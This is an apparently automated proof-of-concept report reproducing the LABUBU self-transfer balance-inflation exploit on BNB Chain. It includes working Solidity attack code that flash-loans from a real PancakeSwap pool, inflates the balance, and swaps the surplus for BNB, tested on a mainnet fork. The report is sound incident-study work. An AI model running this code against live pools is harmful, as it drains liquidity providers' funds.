## Overview & Context

This proof-of-concept (PoC) reproduces the LABUBU balance‑inflation exploit on BNB Chain that drained VOVOToken liquidity from the LABUBU/VOVO Pancake V3 pool and converted it into BNB profit for an attacker. The incident’s root cause, documented in `root_cause_report.md`, is a protocol bug in LABUBU’s non‑standard `_transfer` and `_burn` logic: self‑transfers (`sender == recipient`) increase balances instead of leaving them unchanged, and zero balances are resurrected to a positive constant (`16`). PancakeSwap V3/V2 pools and routers, which assume ERC‑20‑style conservation, are not designed for such tokens, enabling value extraction from liquidity pools.

The PoC models this as an ACT (anyone‑can‑take) opportunity: a clean attacker EOA executes a single Foundry test transaction on a BNB mainnet fork, using only permissionless contracts (LABUBU, VOVOToken, WBNB, Pancake V3/V2 pools and routers, SmartRouter). The goal is to demonstrate that any unprivileged adversary can reproduce the exploit path and achieve native BNB profit tied to the same root cause.

To run the PoC locally, from the Forge project root:

```bash
cd forge_poc
RPC_URL="https://<your-quicknode-endpoint>.bsc.quiknode.pro/<your-token>" forge test --via-ir -vvvvv
```

In this environment, `RPC_URL` is constructed from QuickNode credentials in `.env` and the BNB Chain (`chainid = 56`) template under `artifacts/poc/rpc/chainid_rpc_map.json`. The exploit test uses `vm.createSelectFork(RPC_URL, 44_751_944)` to mirror pre‑incident mainnet state closely aligned with the seed transaction at block `44751945`.

## PoC Architecture & Key Contracts

The core PoC logic lives in `forge_poc/test/Exploit.sol`. It defines interfaces for the on‑chain contracts and two main components: the adversary helper contract `LabubuVovoAttack` and the `ExploitTest` Foundry harness.

- `LabubuVovoAttack`
  - Holds references to:
    - `ILABUBU labubu` — the vulnerable LABUBU token at `0x2fF960F1D9AF1A6368c2866f79080C1E0B253997`.
    - `IERC20 vovo` — VOVOToken at `0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6`.
    - `IWBNB wbnb` — wrapped BNB at `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c`.
    - `IPancakeV3Pool pool` — LABUBU/VOVO Pancake V3 pool at `0xe70294c3D81ea914A883ad84fD80473C048C028C`.
    - `IPancakeRouterV2 router` — Pancake V2 router at `0x10ED43C718714eb63d5aA57B78B54704E256024E`.
    - `ISmartRouter smartRouter` — Pancake SmartRouter at `0x13f4EA83D0bd40E75C8222255bc855a974568Dd4`.
    - `address vovoWbnbPairV2` — VOVO/WBNB Pancake V2 pair at `0xb98f5322a91019311af43cf1d938AD0c59A6148a`.
  - Implements both `IPancakeV3SwapCallback` and `IPancakeV3FlashCallback` so it can participate in V3 swaps and flash loans.
  - Encodes key exploit parameters as constants:

```solidity
uint256 public constant FLASH_LABUBU_AMOUNT = 415636276381601458;
uint256 public constant INFLATION_LOOPS = 8;
uint24 public constant V3_FEE = 2500;
```

These constants capture the LABUBU flash‑loan size, the number of LABUBU self‑transfer iterations, and the V3 fee tier, tuned to reproduce the original exploit while respecting mainnet pool constraints.

- `ExploitTest`
  - Orchestrates the exploit on a mainnet fork and enforces oracles.
  - Binds all real on‑chain contracts and deploys a fresh `LabubuVovoAttack` instance.
  - Uses Foundry’s `vm.label` to annotate key addresses for human‑readable traces.

### Adversary Helper Contract Snippet

The main entrypoint exposed to the test is `reproducerAttack`, which assumes control over the attack sequence while taking the attacker EOA as an explicit parameter:

```solidity
function reproducerAttack(address attacker) external payable {
    require(msg.value > 0, "need BNB");
    require(pool.token0() == address(labubu) && pool.token1() == address(vovo), "unexpected V3 tokens");

    // 1) LABUBU flash loan from V3 pool.
    pool.flash(address(this), FLASH_LABUBU_AMOUNT, 0, abi.encode(FLASH_LABUBU_AMOUNT));

    uint256 inflatedLabubu = labubu.balanceOf(address(this));
    require(inflatedLabubu > 0, "no LABUBU after flash");

    // 2) Swap inflated LABUBU surplus into VOVO via SmartRouter.
    // 3) Route VOVO through VOVO/WBNB V2 pair and WBNB::withdraw to attacker.
    ...
}
```

The flash loan triggers `pancakeV3FlashCallback`, where LABUBU’s self‑transfer bug is exercised, and the surplus LABUBU is retained after repaying principal plus fee. The remaining steps convert that surplus into VOVOToken and then into WBNB and finally BNB for the attacker.

## Adversary Execution Flow

The adversary flow as implemented in `ExploitTest::testExploit` and `LabubuVovoAttack` mirrors the root‑cause incident but uses a clean attacker EOA and local helper contract.

### 1. Funding and Environment Setup

`ExploitTest.setUp` prepares the mainnet fork and actors:

```solidity
string memory rpcUrl = vm.envString("RPC_URL");
uint256 forkId = vm.createSelectFork(rpcUrl, 44_751_944);
vm.selectFork(forkId);

attacker = makeAddr("attacker");
vm.deal(attacker, 1 ether);
```

The test then binds the real LABUBU, VOVOToken, WBNB, LABUBU/VOVO V3 pool, VOVO/WBNB V2 pair, PancakeRouterV2, and SmartRouter addresses, and deploys `LabubuVovoAttack`. Finally, it runs oracle pre‑checks to ensure:

- The V3 pool has substantial VOVOToken liquidity.
- The V2 pair has non‑trivial VOVOToken and WBNB reserves.
- The attacker starts with less than `5 ether` of BNB (ensuring visible profit).

### 2. Flash Loan and LABUBU Balance Inflation

Within `reproducerAttack`, the attack contract initiates a LABUBU flash loan:

```solidity
pool.flash(address(this), FLASH_LABUBU_AMOUNT, 0, abi.encode(FLASH_LABUBU_AMOUNT));
```

The pool calls back into `pancakeV3FlashCallback`, where the key LABUBU bug is triggered:

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external override {
    require(msg.sender == address(pool), "invalid flash caller");
    uint256 amount0 = abi.decode(data, (uint256));

    // LABUBU self-transfer inflation loop.
    uint256 bal = labubu.balanceOf(address(this));
    for (uint256 i = 0; i < INFLATION_LOOPS; ++i) {
        labubu.transfer(address(this), bal);
        bal = labubu.balanceOf(address(this));
    }

    // Repay principal + fee; retain inflated surplus.
    labubu.transfer(address(pool), amount0 + fee0);
}
```

Because LABUBU’s `_transfer` updates both sender and recipient even when they are the same, each self‑transfer increases the contract’s LABUBU balance instead of leaving it unchanged, exactly exercising the root‑cause vulnerability.

### 3. Draining VOVOToken and Routing via V2 Pair

After the flash is repaid, the contract holds a surplus of LABUBU. It swaps most of this surplus into VOVOToken via Pancake SmartRouter, targeting the LABUBU/VOVO V3 pool:

```solidity
uint256 inflatedLabubu = labubu.balanceOf(address(this));
uint256 labubuForVovo = (inflatedLabubu * 9) / 10;
labubu.approve(address(smartRouter), labubuForVovo);

ISmartRouter.ExactInputSingleParams memory params = ISmartRouter.ExactInputSingleParams({
    tokenIn: address(labubu),
    tokenOut: address(vovo),
    fee: V3_FEE,
    recipient: address(this),
    amountIn: labubuForVovo,
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
});

uint256 vovoOut = smartRouter.exactInputSingle(params);
require(vovoOut > 0, "no VOVO from LABUBU surplus");
```

This step drains VOVOToken from the LABUBU/VOVO V3 pool in the same direction observed in the incident: LABUBU is sold into the pool, VOVOToken is received.

The contract then swaps the obtained VOVOToken into WBNB through the VOVO/WBNB V2 pair, sending the resulting WBNB into the router and unwrapping it into native BNB for the attacker EOA:

```solidity
vovo.approve(address(router), vovoOut);

address[] memory pathOut = new address[](2);
pathOut[0] = address(vovo);
pathOut[1] = address(wbnb);

router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    vovoOut,
    0,
    pathOut,
    attacker,
    block.timestamp + 1 hours
);
```

### 4. Oracle-Aligned Assertions in `testExploit`

The main test function snapshots balances before the exploit, calls `reproducerAttack`, and checks all hard and soft oracles:

```solidity
uint256 attackerBalanceBefore = attacker.balance;
uint256 poolVovoBefore = vovo.balanceOf(address(pool));
uint256 pairVovoBefore = vovo.balanceOf(vovoWbnbPairV2);
uint256 labubuBefore = labubu.balanceOf(address(attackContract));

vm.startPrank(attacker);
attackContract.reproducerAttack{value: 0.5 ether}(attacker);
vm.stopPrank();

uint256 attackerBalanceAfter = attacker.balance;
uint256 poolVovoAfter = vovo.balanceOf(address(pool));
uint256 pairVovoAfter = vovo.balanceOf(vovoWbnbPairV2);
uint256 labubuAfter = labubu.balanceOf(address(attackContract));

assertGt(attackerBalanceAfter, attackerBalanceBefore);
assertGt(labubuAfter, labubuBefore);
assertGe(attackerBalanceAfter - attackerBalanceBefore, 0.1 ether);
assertLt(poolVovoAfter, poolVovoBefore - 1_000 ether);
assertGe(pairVovoAfter - pairVovoBefore, 1_000 ether);
```

These assertions align exactly with the oracles defined in `oracle_definition.json`:

- Hard constraints:
  - Attacker’s native BNB balance increases (asset‑type oracle).
  - Attack contract’s LABUBU balance increases due to self‑transfer inflation.
  - The attack path completes without revert (implicit in test success).
- Soft constraints:
  - Attacker profits by at least `0.1` BNB.
  - VOVOToken reserves in the LABUBU/VOVO V3 pool decrease by at least `1_000` VOVO.
  - VOVOToken reserves in the VOVO/WBNB V2 pair increase by at least `1_000` VOVO.

## Oracle Definitions and Checks

The oracle specification in `artifacts/poc/oracle_generator/oracle_definition.json` defines variables, pre‑checks, and constraints that the PoC must satisfy.

- Variables:
  - `attacker` — the attacking EOA (fresh address in the PoC).
  - `attack_contract` — the helper contract (`LabubuVovoAttack`).
  - `labubu_token` — LABUBU, vulnerable ERC‑20‑like token.
  - `vovo_token` — VOVOToken.
  - `wbnb_token` — WBNB wrapped token.
  - `native_bnb` — BNB native asset.
  - `labubu_vovo_pool_v3` — LABUBU/VOVO Pancake V3 pool.
  - `vovo_wbnb_pair_v2` — VOVO/WBNB Pancake V2 pair.

### Pre-check Oracles

The three `pre_check` entries ensure the forked state is meaningful:

1. **V3 pool VOVO liquidity**
   - Requirement: LABUBU/VOVO V3 pool holds substantial VOVOToken.
   - Implementation: `ExploitTest.setUp` reads `vovo.balanceOf(address(pool))` and asserts `>= 1e20`.

2. **V2 pair VOVO/WBNB liquidity**
   - Requirement: VOVO/WBNB pair has non‑trivial VOVOToken and WBNB reserves.
   - Implementation: checks `vovo.balanceOf(vovoWbnbPairV2)` and `wbnb.balanceOf(vovoWbnbPairV2)` against `>= 1e18`.

3. **Attacker not pre‑rich**
   - Requirement: attacker EOA starts with less than `5` BNB.
   - Implementation: `vm.deal(attacker, 1 ether)` and assertion `assertLt(attackerBalanceBefore, 5 ether)`.

### Hard Constraints

1. **Native BNB Profit**
   - Oracle: attacker’s native BNB balance after the exploit must exceed the pre‑state.
   - PoC: `assertGt(attackerBalanceAfter, attackerBalanceBefore)` in `testExploit`.

2. **LABUBU Self-Transfer Inflation**
   - Oracle: `attack_contract`’s LABUBU balance must increase due to self‑transfers.
   - PoC: measures `labubuBefore`/`labubuAfter` around `reproducerAttack` and asserts `labubuAfter > labubuBefore`.
   - Mechanism: `pancakeV3FlashCallback` calls `labubu.transfer(address(this), bal)` in a loop, directly exploiting the non‑standard `_transfer`.

3. **Flashloan Attack Success (No Revert)**
   - Oracle: `reproducerAttack` must execute without revert for an unprivileged attacker.
   - PoC: the entire `testExploit` passes successfully on a mainnet fork (`forge-test.log` shows `[PASS] testExploit()`), confirming that flash loan, inflation, swaps, and repayments are all executable.

### Soft Constraints

1. **Attacker Native BNB Profit Magnitude**
   - Threshold: at least `0.1` BNB profit (`1e17` wei).
   - PoC: `assertGe(attackerBalanceAfter - attackerBalanceBefore, 0.1 ether)`.

2. **V3 Pool VOVO Depletion**
   - Threshold: VOVOToken reserves in V3 pool decrease by at least `1_000` VOVO (`1_000 ether` units).
   - PoC: `assertLt(poolVovoAfter, poolVovoBefore - 1_000 ether)`.

3. **V2 Pair VOVO Inflow**
   - Threshold: VOVOToken reserves in V2 pair increase by at least `1_000` VOVO.
   - PoC: `assertGe(pairVovoAfter - pairVovoBefore, 1_000 ether)`.

These checks collectively show that the exploit path faithfully moves VOVOToken from the V3 pool into the V2 pair before converting to WBNB and then BNB.

## Validation Result and Robustness

The validator re‑ran the PoC with full tracing:

- Command:

```bash
cd /home/wesley/TxRayExperiment/incident-202601031804/forge_poc
RPC_URL="<constructed-BNB-mainnet-URL>" forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

- Outcome:
  - `test/Exploit.sol:ExploitTest::testExploit` passes with gas usage around `1,094,857`.
  - The trace confirms:
    - A LABUBU flash loan from the LABUBU/VOVO V3 pool.
    - LABUBU self‑transfer inflation within `pancakeV3FlashCallback`.
    - VOVOToken flowing out of the V3 pool and into the VOVO/WBNB V2 pair.
    - WBNB being withdrawn to native BNB and credited to the attacker EOA.

The validator’s JSON result is recorded at:

```json
{
  "overall_status": "Pass",
  "artifacts": {
    "validator_test_log_path": "artifacts/poc/poc_validator/forge-test.log"
  },
  ...
}
```

It concludes that:

- All hard and soft oracles from `oracle_definition.json` are satisfied.
- The PoC runs on a BNB mainnet fork at block `44_751_944` with no local mocks.
- The attack path is fully executable by an unprivileged EOA, demonstrating an ACT opportunity.

## Linking PoC Behavior to Root Cause

The PoC strongly aligns with the root‑cause analysis in `root_cause_report.md`:

- **Root Cause**: LABUBU’s `_transfer` and `_burn` functions break balance conservation:
  - Self‑transfers increase balances.
  - Zero balances are resurrected to `16`.
- **PoC Exercise of Root Cause**:
  - `pancakeV3FlashCallback` explicitly relies on LABUBU self‑transfers to grow the attack contract’s balance during a flash loan, exactly the misuse discussed in the report.
  - The attacker never mints new tokens via privileged functions; all inflation arises from the buggy transfer logic.

- **Victim and Routing Path**:
  - Victim pool: LABUBU/VOVO Pancake V3 pool at `0xe70294c3D81ea914A883ad84fD80473C048C028C`.
  - Routing pool: VOVO/WBNB Pancake V2 pair at `0xb98f5322a91019311af43cf1d938AD0c59A6148a`.
  - The PoC drains VOVOToken from the V3 pool and pushes it into the V2 pair before selling for WBNB and then BNB, matching the described flow.

- **ACT Framing and Roles**:
  - Adversary‑crafted actions:
    - The attacker EOA triggers `reproducerAttack` on `LabubuVovoAttack` with `0.5` BNB.
    - The helper contract orchestrates the flash loan, self‑transfer loop, SmartRouter and PancakeRouter calls.
  - Victim‑observed effects:
    - LABUBU/VOVO V3 pool loses substantial VOVOToken reserves.
    - VOVO/WBNB V2 pair receives increased VOVOToken reserves and outputs WBNB.
    - The attacker EOA’s BNB balance increases.

Together, these steps show that the PoC is not just a synthetic scenario but a faithful reproduction of the incident’s exploit mechanics, satisfying both the oracle‑based specification and the independent root‑cause analysis. The result is a high‑quality, mainnet‑fork‑based PoC that clearly demonstrates how LABUBU’s broken transfer semantics can be exploited by any unprivileged party to drain VOVOToken liquidity and realize BNB profit.

